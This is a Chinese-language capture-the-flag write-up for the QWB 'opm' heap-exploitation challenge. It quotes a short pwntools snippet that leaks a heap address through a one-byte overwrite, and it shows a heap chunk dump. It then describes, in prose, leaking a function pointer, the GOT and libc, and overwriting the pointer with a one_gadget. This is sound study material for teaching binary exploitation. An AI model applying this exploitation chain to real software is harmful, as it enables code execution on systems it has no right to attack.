#qwb ctf  opm writeup

###废话

鱼师傅说这是道堆的拼图游戏，做着做着感觉自己智商-1。
但是我不想每次都-1，不然把仅存的0x1都减完了，还是仔细看看吧。

### 做题时想法和看到wp后

```c
struct{
void *func
void *name = malloc(namelen);
    namelen = strlen;
    punches;
}
```
```c
a
b
c    ---->  a
d    ---->  b
     ---->  c
     ---->  d
```
大概率是贫穷限制了我的想象力吧。因为我们只能打印出b和d的内容，然后b和d都是在堆上的，堆上有什么？堆上只有堆的地址、还有一个函数地址。但是显然不可能打印出函数地址。于是我就想构造如上图的关系，但abc、和d是分开写的，于是上图的关系是不可能实现了。想破脑袋也不知道怎么回事。

来看看wp：

```c
newrole('a'*0x50, str(233))
newrole('a'*0x80 + chr(0x30), str(233))
newrole('a'*0x80, str(233).ljust(0x80,'c') + chr(0x30))
io.recvuntil('<'+'a'*0x28)
heap_addr = u64(io.recvuntil('>')[:-1].ljust(8, chr(0))) - 0x1A0
log.success("heap address:"+hex(heap_addr))
```
看完这几行代码，确实对自己的智商感到忧愁，看看堆布局：

```c
addr                prev      size      status            fd                bk
0x55aa83114000      0x0       0x11c10    Used                None              None
0x55aa83125c10      0x0       0x30       Used                None              None
0x55aa83125c40      0x0       0x60       Used                None              None
0x55aa83125ca0      0x0       0x30       Used                None              None
0x55aa83125cd0      0x0       0x90       Used                None              None
0x55aa83125d60      0x30      0x30       Used                None              None
0x55aa83125d90      0x0       0x90       Used                None              None
```
可以看到第3个chunk已经进1，此时覆写最后一个字节的话就会让结构体的abc落入前面的buf区，就可以打印出来。

但是我们这时候已经没办法打印第2次的结构体了，怎么办，先把第2次的abc存起来，到第3次才打印。

这样就可以泄露第3次申请的buf的堆地址。


###接下来
泄露了堆地址后要想办法泄露libc。
但是没有堆上没有libc，还有一个函数地址，泄露了函数地址就可以泄露got表地址，再通过got表去泄露libc。

怎么泄露函数地址，想想0x0030处还存着我们的fake struct。想办法把d写在b上，于是在0x0020的地方就可以。

###libc
有了函数地址，就可以算出got表地址，再如法炮制打印出got表内容就泄露了libc。泄露了libc把函数指针改成one_gadget即可。

### 总结

感觉这种题太靠脑洞了，智商-10。


